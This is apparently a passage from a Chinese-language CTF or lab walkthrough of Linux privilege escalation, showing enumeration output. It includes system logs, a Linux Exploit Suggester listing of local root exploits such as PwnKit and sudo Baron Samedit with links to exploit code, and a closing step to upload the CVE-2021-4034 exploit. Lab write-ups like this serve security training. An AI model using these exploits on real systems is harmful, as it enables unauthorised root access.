Oct 20 20:06:15 love systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
Oct 20 20:07:26 love gdm-password]: pam_unix(gdm-password:session): session opened for user love by (uid=0)
Oct 20 20:07:29 love /usr/lib/gdm3/gdm-x-session[1288]: dbus-update-activation-environment: setting PWD=/home/love
Oct 20 20:27:20 love gdm-password]: gkr-pam: unlocked login keyring
Oct 20 20:27:20 love gnome-keyring-daemon[1284]: couldn't initialize slot with master password: The password or PIN is incorrect
Oct 20 20:29:04 love sudo:     love : TTY=pts/1 ; PWD=/home/love ; USER=root ; COMMAND=/usr/bin/apt update
Oct 20 20:30:15 love kernel: [    6.505551] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Oct 20 20:30:15 love systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
Oct 20 20:31:10 love gdm-password]: pam_unix(gdm-password:auth): authentication failure; logname= uid=0 euid=0 tty=/dev/tty1 ruser= rhost=  user=love
Oct 20 20:31:16 love gdm-password]: pam_unix(gdm-password:session): session opened for user love by (uid=0)
Oct 20 20:31:19 love /usr/lib/gdm3/gdm-x-session[1211]: dbus-update-activation-environment: setting PWD=/home/love
Oct 20 20:31:41 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/usr/bin/apt install apache2
Oct 20 20:34:42 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl stop apache2.service
Oct 20 20:34:46 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl start apache2.service
Oct 20 20:34:51 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl enable apache2.service
Oct 20 20:34:54 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/usr/bin/apt-get install mariadb-server mariadb-client -y
Oct 20 20:36:31 love chage[3891]: changed password expiry for mysql
Oct 20 20:39:28 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl stop mariadb.service
Oct 20 20:39:36 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl start mariadb.service
Oct 20 20:39:46 love sudo:     love : TTY=pts/0 ; PWD=/home/love ; USER=root ; COMMAND=/bin/systemctl enable mariadb.service
Oct 20 20:40:33 love sudo:     love : TTY=pts/0 ; PWD=/home/love/Desktop ; USER=root ; COMMAND=/bin/mv sar2HTML/ /var/www/html/
Oct 20 20:42:30 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm index.php LICENSE sar2html
Oct 20 20:42:42 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm -rf sarFILE/
Oct 20 20:42:54 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html/sar2HTML ; USER=root ; COMMAND=/usr/bin/apt install net-tools
Oct 20 20:43:14 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html/sar2HTML ; USER=root ; COMMAND=/usr/bin/apt install curl
Oct 20 20:44:40 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html/sar2HTML/
Oct 20 20:44:49 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/html/sar2HTML/
Oct 20 20:45:30 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl stop apache2.service
Oct 20 20:45:33 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl start apache2.service
Oct 20 20:45:37 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl enable apache2.service
Oct 20 20:46:24 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm -rf sar2HTML/
Oct 20 20:46:38 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl stop apache2.service
Oct 20 20:47:27 love sudo:     love : TTY=pts/0 ; PWD=/home/love/Documents ; USER=root ; COMMAND=/bin/mv sar2HTML/ /var/www/html/
Oct 20 20:47:39 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html/sar2HTML/
Oct 20 20:47:48 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/html/sar2HTML/
Oct 20 20:48:01 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl restart apache2.service
Oct 20 20:48:06 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl status apache2.service
Oct 20 20:49:05 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/mysql_secure_installation
Oct 20 20:49:33 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/mysql_secure_installation
Oct 20 20:49:52 love sudo:     love : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/apt-get install software-properties-common



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                      
                                ╚════════════════╝                                                                      
Regexes to search for API keys aren't activated, use param '-r' 


```

列出了一些用于提权的内核漏洞

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester   
[+] [CVE-2021-4034] PwnKit                                                                                              

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2020-9470] Wing FTP Server <= 6.2.5 LPE

   Details: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php
   Exposure: probable
   Tags: [ ubuntu=18 ]
   Download URL: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh
   Comments: Requires an administrator to login via the web interface.

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-12181] Serv-U FTP Server

   Details: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html
   Exposure: less probable
   Tags: debian=9
   Download URL: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c
   ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot
   Comments: Modified version at 'ext-url' uses bash exec technique, rather than compiling with gcc.

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
```

上传cve-2021-4034
